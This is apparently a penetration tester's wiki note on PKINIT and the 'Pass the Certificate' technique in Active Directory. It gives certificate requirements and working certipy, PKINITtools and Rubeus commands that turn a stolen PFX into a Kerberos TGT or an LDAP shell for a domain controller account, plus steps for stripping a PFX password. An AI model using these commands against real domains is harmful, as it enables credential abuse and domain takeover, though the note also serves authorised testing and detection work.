---
title: PKINIT
---

PKINIT or Public Key Cryptography for Initial Authentication is a [[notes/ad/kerberos]] extension for asymmetric, certificated-based pre-authentication.
If you have a users private key and certificate you can obtain a [[notes/ad/kerberos-tgt]] for that user.

Requirements:

- The certificate SAN must contain the UPN of a user or the FQDN of a computer.
- The *ExtendedKeyUsage* (EKU) extension must contain one of the following *Object Identifiers* (OIDs) ([source](https://web.archive.org/web/20221118210651/https://scribe.rip/@specterops/certified-pre-owned-d95910965cd2)):
    - Client Authentication (1.3.6.1.5.5.7.3.2)
    - PKINIT Client Authentication (1.3.6.1.5.2.3.4)
    - Smartcard Logon (1.3.6.1.4.1.311.20.2.2)
    - Any Purpose (2.5.29.37.0)
    - SubCA (no EKU present)
- The certificate of the issuing CA must be part of the `NTAuth` container.

References:

- [Anomaly detection in certificate-based TGT requests](http://web.archive.org/web/20230804175159/https://securelist.com/anomaly-detection-in-certificate-based-tgt-requests/110242/)
- [thehacker.recipes/ad/movement/kerberos/pass-the-certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate)

# Pass the Certificate

=== "[[notes/tools/certipy]]"
    ~~~ bash
    certipy auth -no-hash -pfx ./dc01.pfx
    export KRB5CCNAME=$PWD/dc01.ccache
    ~~~

=== "[[notes/tools/pkinittools]]"
    ~~~ bash
    pkinittools-gettgtpkinit -cert-pfx ./dc01.pfx 'corp.com/dc01$' ./dc01.ccache
    export KRB5CCNAME=$PWD/dc01.ccache
    ~~~

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe asktgt /nowrap /user:dc01$ /certificate:%base64_pfx%
    ~~~

> **Note:**
>
> If `certipy` fails try `pkinittools` instead.
> If the authentication fails with `KDC_ERROR_CLIENT_NOT_TRUSTED` try a different DC ([source](https://twitter.com/Bandrel/status/1706341579911319936)).
> If authentication keeps failing maybe *Strong Certificate Mapping* is enforced and the user SID must be added to the certificate.
> See [Lord of the SID: How to add the objectSID attribute to a certificate manually](https://web.archive.org/web/20230330160919/https://elkement.blog/2023/03/30/lord-of-the-sid-how-to-add-the-objectsid-attribute-to-a-certificate-manually/) for details.

Remove password from PFX file.

=== "[[notes/tools/certipy]]"
    ~~~ bash
    certipy cert -pfx ./admin.pfx -password 'passw0rd' -export -out ./admin-unprotected.pfx
    ~~~

Combine private key and certificate into a PFX file.

~~~ bash
echo $cert | base64 -d > ./cert.pem
echo $key | base64 -d >> ./cert.pem
openssl pkcs12 -in ./cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out ./cert.pfx
~~~

# LDAP SChannel

If PKINIT is not configured you can still get a LDAP shell.

=== "[[notes/tools/certipy]]"
    ~~~ bash
    certipy auth -ldap-shell -pfx ./dc01.pfx
    ~~~

Untested tools:

- [PassTheCert.py](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python)

References:

- [Supply in the Request Shenanigans](http://web.archive.org/web/20221130213151/https://blog.qdsecurity.se/2020/09/04/supply-in-the-request-shenanigans/), use client certificate to authenticate against LDAP with StartTLS
- [Pass the Cert: Authenticating with certificates when PKINIT is not supported](http://web.archive.org/web/20221130213213/https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
